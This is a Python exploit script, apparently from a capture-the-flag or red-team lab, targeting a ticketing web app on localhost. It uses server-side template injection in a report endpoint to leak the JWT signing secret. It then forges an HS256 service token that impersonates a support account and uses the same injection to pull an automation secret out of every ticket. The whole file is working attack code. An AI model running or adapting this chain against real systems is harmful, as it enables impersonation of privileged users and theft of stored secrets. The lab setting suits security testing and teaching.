import argparse
import base64
import hashlib
import hmac
import json
import sys
import time

import requests

from _common import auth_headers, create_ticket, info, ok, register_or_login


TARGET_MARKER = "FLAG_VULN5_automation_secret_"


def forge_jwt(secret: str, subject: str, kind: str, ttl_seconds: int = 3600) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": subject, "kind": kind, "exp": int(time.time()) + ttl_seconds}

    def b64(data: dict) -> str:
        raw = json.dumps(data, separators=(",", ":")).encode("utf-8")
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")

    head = b64(header)
    body = b64(payload)
    signing_input = f"{head}.{body}".encode("utf-8")
    sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return f"{head}.{body}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode('ascii')}"


def render_report(base_url: str, token: str, ticket_id: str, template: str) -> str:
    r = requests.post(
        f"{base_url}/api/reports",
        headers=auth_headers(token),
        json={"ticket_id": ticket_id, "custom_template": template},
        timeout=10,
    )
    r.raise_for_status()
    return r.json()["content"]


def main():
    ap = argparse.ArgumentParser(description="Vuln 5: SSTI -> JWT leak -> forged service token -> automation_secret")
    ap.add_argument("--base", default="http://localhost:7070")
    ap.add_argument("--support-username", default="support",
                    help="username of the privileged support account to impersonate")
    args = ap.parse_args()

    username, token = register_or_login(args.base, prefix="red_v5")
    ok(f"registered attacker {username}")

    own = create_ticket(args.base, token, title="ssti case", description="own")
    ok(f"created own ticket {own['id']}")

    ssti_template = "{{ runtime.defaults.jwt_secret }}"
    info(f"leaking JWT secret via template: {ssti_template!r}")
    rendered = render_report(args.base, token, own["id"], ssti_template)
    jwt_secret = rendered.strip()
    if not jwt_secret or len(jwt_secret) < 16:
        info(f"unexpected SSTI output: {rendered!r}")
        sys.exit(3)
    ok(f"jwt_secret leaked (length={len(jwt_secret)}): {jwt_secret}")

    forged = forge_jwt(jwt_secret, subject=args.support_username, kind="service")
    ok(f"forged support JWT: {forged}")

    r = requests.get(f"{args.base}/api/users/me", headers=auth_headers(forged), timeout=10)
    r.raise_for_status()
    me = r.json()
    ok(f"forged token resolves as username={me['username']} role={me['role']} support_mode={me['support_mode']}")

    r = requests.get(f"{args.base}/api/tickets", headers=auth_headers(forged), timeout=10)
    r.raise_for_status()
    tickets = r.json()
    ok(f"forged-support view shows {len(tickets)} tickets")

    info("extracting automation_secret from each ticket via SSTI render")
    found = []
    for ticket in tickets:
        tid = ticket["id"]
        try:
            rendered = render_report(
                args.base, forged, tid, "{{ ticket.automation_secret }}"
            )
        except requests.HTTPError as e:
            info(f"skip {tid}: {e}")
            continue
        rendered = rendered.strip()
        if TARGET_MARKER in rendered:
            found.append((ticket.get("case_number"), tid, rendered))
            ok(f"flag from {ticket.get('case_number')} ({tid}): {rendered}")

    if not found:
        info("walked tickets did not yield a matching flag. values seen:")
        for ticket in tickets[:10]:
            info(f"  {ticket.get('case_number')}: {ticket}")
        sys.exit(2)

    for case, tid, secret in found:
        ok(f"flag ({case} / {tid}): {secret}")


if __name__ == "__main__":
    main()
